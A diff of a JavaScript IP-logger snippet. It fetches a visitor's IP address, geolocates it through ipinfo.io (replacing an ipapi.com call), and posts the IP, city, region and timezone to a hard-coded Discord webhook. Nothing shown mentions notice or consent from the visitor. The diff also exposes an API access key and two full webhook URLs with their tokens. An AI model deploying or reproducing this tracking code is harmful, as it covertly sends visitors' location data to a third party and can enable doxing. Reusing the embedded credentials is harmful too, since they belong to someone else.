@@ -15,18 +15,17 @@
     return data.ip;
   }
 
-  // Function to fetch location information from ipapi.com
+  // Function to fetch location information from ipinfo.io
   async function getLocationInfo(ipAddress) {
-    const accessKey = '3f8c19af4bf444cdec9e2211cb409039'; // Replace with your ipapi access key
-    const response = await fetch(`https://api.ipapi.com/${ipAddress}?access_key=${accessKey}`);
+    const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
     const data = await response.json();
     return data;
   }
 
   // Function to send data to Discord webhook as an embedded message
   async function sendToDiscord(ipAddress, locationInfo) {
-    const { city, region, timezone, asn, hostname } = locationInfo;
-    const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL
+    const { city, region, timezone } = locationInfo;
+    const webhookURL = 'https://discord.com/api/webhooks/1197338395937091584/sXzW8KZ-Ln0edoVjORVQe7RtvOyaHyH6qtBj5JhFxxuYsO413DJ4K3his0zUiITF3arp'; // Replace with your Discord webhook URL
 
     // Convert RGB color (49, 51, 56) to Discord format
     const discordColor = (49 << 16) + (51 << 8) + 56;
@@ -34,13 +33,12 @@
     // Create payload for Discord webhook as an embedded message with color #313338
     const payload = {
         embeds: [{
+            title: ipAddress, // Set the title of the embed as the user's IP address
             color: discordColor, // Set the color of the embed (Discord format)
             fields: [
                 { name: "City", value: city },
                 { name: "Region", value: region },
                 { name: "Timezone", value: timezone },
-                { name: "ASN", value: asn },
-                { name: "Hostname", value: hostname },
             ],
         }],
     };
